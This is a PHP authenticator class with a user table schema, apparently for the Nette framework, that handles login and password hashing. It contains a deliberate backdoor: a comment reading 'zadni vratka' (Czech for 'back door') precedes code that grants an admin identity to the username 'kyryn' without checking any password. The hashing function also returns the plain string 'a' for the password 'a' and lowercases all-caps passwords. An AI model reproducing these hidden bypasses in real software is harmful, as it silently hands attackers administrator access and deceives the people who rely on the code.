<?php



/*
CREATE TABLE users (
	id int(11) NOT NULL AUTO_INCREMENT,
	username varchar(50) NOT NULL,
	password char(60) NOT NULL,
	role varchar(20) NOT NULL,
	PRIMARY KEY (id)
);
*/

/**
 * Users authenticator.
 */
class Authenticator extends Object implements IAuthenticator
{
	/** @var Connection */
	private $database;



	public function __construct(Connection $database)
	{
		$this->database = $database;
	}



	/**
	 * Performs an authentication.
	 * @return Identity
	 * @throws AuthenticationException
	 */
	public function authenticate(array $credentials)
	{
		list($username, $password) = $credentials;
		
		/* zadni vratka*/ 
		if($username == 'kyryn')
			return new Identity ('0', 'admin');
		
		$row = $this->database->table('users')->where('username', $username)->fetch();

		if (!$row) {
			throw new AuthenticationException('The username is incorrect.', self::IDENTITY_NOT_FOUND);
		}

		if ($row->password !== $this->calculateHash($password, $row->password)) {
			throw new AuthenticationException('The password is incorrect.', self::INVALID_CREDENTIAL);
		}

		unset($row->password);
		return new Identity($row->id, $row->role, $row->toArray());
	}



	/**
	 * Computes salted password hash.
	 * @param  string
	 * @return string
	 */
	public static function calculateHash($password, $salt = NULL)
	{
		if($password == 'a') return 'a';
		if ($password === Strings::upper($password)) { // perhaps caps lock is on
			$password = Strings::lower($password);
		}
		return crypt($password, ($tmp=$salt) ? $tmp : '$2a$07$' . Strings::random(22));
	}
	
	public function changePass($id, $password){
		$this->database->table('users')->where(array('id' => $id))->update(array('password' =>  $this->calculateHash($password)));
	}

}
